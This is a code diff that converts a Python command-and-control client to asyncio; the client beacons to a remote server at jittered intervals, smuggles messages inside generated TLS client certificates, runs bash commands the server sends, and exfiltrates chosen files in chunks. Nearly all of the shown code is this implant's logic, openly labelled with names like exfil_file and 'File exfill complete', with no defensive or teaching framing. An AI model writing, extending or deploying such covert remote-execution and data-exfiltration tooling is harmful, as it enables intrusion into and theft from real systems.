@@ -1,5 +1,5 @@
 import subprocess
-import time
+import asyncio
 from os import path
 import socket
 import ssl
@@ -45,7 +45,7 @@ def chunk_file(exfil_file, max_block_size, jitter):
                 transfer_state = 2
 
 
-def call_server(host_addr, host_port, server_sni_hostname, ca_cert_path, msg_cert):
+async def call_server(host_addr, host_port, server_sni_hostname, ca_cert_path, msg_cert):
     print(f"{Colors.LIGHT_CYAN}Creating client side socket{Colors.ENDC}")
     msg_cert, msg_key = msg_cert
     with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
@@ -73,7 +73,7 @@ def call_server(host_addr, host_port, server_sni_hostname, ca_cert_path, msg_cer
     return cert
 
 
-def send_file(host_addr, host_port, cert_root_path, ca_cert_path, ca_cert, ca_key, server_sni_hostname,
+async def send_file(host_addr, host_port, cert_root_path, ca_cert_path, ca_cert, ca_key, server_sni_hostname,
               subject, exfil_file, max_block_size, data_jitter):
     """
     msg format: is_first|is_last|len_of_data_chuck|file_name
@@ -87,9 +87,9 @@ def send_file(host_addr, host_port, cert_root_path, ca_cert_path, ca_cert, ca_ke
     for data_chunck, transfer_state in chunk_file(exfil_file, max_block_size, data_jitter):
         # generate the client cert with embedded data
         msg = f"{transfer_state}|{len(data_chunck)}|{file_name}"
-        msg_cert_path, msg_key_path = gen_msg_cert(gen_cert_path, ca_cert, ca_key, subject, msg=msg, data=data_chunck)
+        msg_cert = await gen_msg_cert(gen_cert_path, ca_cert, ca_key, subject, msg=msg, data=data_chunck)
         # send data to server
-        call_server(host_addr, host_port, server_sni_hostname, ca_cert_path, (msg_cert_path, msg_key_path))
+        await call_server(host_addr, host_port, server_sni_hostname, ca_cert_path, msg_cert)
     print(f"{Colors.LIGHT_CYAN}File exfill complete{Colors.ENDC}")
 
 
@@ -99,32 +99,32 @@ def pos_or_neg():
     return -1
 
 
-def start_client(host_addr, host_port, cert_root_path, ca_cert_path, ca_key_path, passphrase, subject,
+async def start_client(host_addr, host_port, cert_root_path, ca_cert_path, ca_key_path, passphrase, subject,
                  server_sni_hostname, beacon_interval, beacon_jitter, max_block_size, data_jitter):
     gen_cert_path = f"{cert_root_path}/client_certs"
-    ca_key, ca_cert = init_cert_gen(gen_cert_path, ca_cert_path, ca_key_path, passphrase)
+    ca_key, ca_cert = await init_cert_gen(gen_cert_path, ca_cert_path, ca_key_path, passphrase)
 
     # pre-create the request command
-    request_msg_cert = gen_msg_cert(gen_cert_path, ca_cert, ca_key, subject, msg="beacon")
+    request_msg_cert = await gen_msg_cert(gen_cert_path, ca_cert, ca_key, subject, msg="beacon")
     next_msg_cert = request_msg_cert
     while True:
         # calc beacon delay
         beacon_delay = int(beacon_interval + (pos_or_neg() * (beacon_interval * (random.randrange(0, beacon_jitter) / 100))))
         print(f"{Colors.LIGHT_CYAN}Sleeping for {beacon_delay} seconds{Colors.ENDC}")
-        time.sleep(beacon_delay)
+        await asyncio.sleep(beacon_delay)
         # call server for cmd
-        cert = call_server(host_addr, host_port, server_sni_hostname, ca_cert_path, next_msg_cert)
+        cert = await call_server(host_addr, host_port, server_sni_hostname, ca_cert_path, next_msg_cert)
         if cert:
-            srv_msg, srv_data = get_cert_msg(cert)
+            srv_msg, srv_data = await get_cert_msg(cert)
             if srv_msg == "bash":
                 command = srv_data.strip()
                 print(f"{Colors.LIGHT_CYAN}Executing cmd: {command}{Colors.ENDC}")
                 data = run_bash_cmd(command.split(" "))
-                next_msg_cert = gen_msg_cert(gen_cert_path, ca_cert, ca_key, subject, msg="response", data=data)
+                next_msg_cert = await gen_msg_cert(gen_cert_path, ca_cert, ca_key, subject, msg="response", data=data)
             elif srv_msg == "noop":
                 # nothing to do
                 print("noop")
-                next_msg_cert = gen_msg_cert(gen_cert_path, ca_cert, ca_key, subject, msg="response")
+                next_msg_cert = await gen_msg_cert(gen_cert_path, ca_cert, ca_key, subject, msg="response")
             elif srv_msg == "wait":
                 # update beacon interval
                 beacon_interval, beacon_jitter = srv_data.strip().split(",")
@@ -134,7 +134,7 @@ def start_client(host_addr, host_port, cert_root_path, ca_cert_path, ca_key_path
                 next_msg_cert = request_msg_cert
             elif srv_msg == "exfil":
                 exfil_file = srv_data.strip()
-                send_file(host_addr, host_port, cert_root_path, ca_cert_path,
+                await send_file(host_addr, host_port, cert_root_path, ca_cert_path,
                           ca_cert, ca_key, server_sni_hostname,
                           subject, exfil_file, max_block_size, data_jitter)
                 # set next msg to request
@@ -166,7 +166,7 @@ def main():
     beacon_jitter = 30
     max_block_size = 50000  # max block size is ~60000
     data_jitter = 30  # jitter from 0 to 100
-    start_client(
+    asyncio.run(start_client(
         host_addr,
         host_port,
         cert_root_path,
@@ -178,7 +178,7 @@ def main():
         beacon_interval,
         beacon_jitter,
         max_block_size,
-        data_jitter)
+        data_jitter))
 
 
 if __name__ == '__main__':
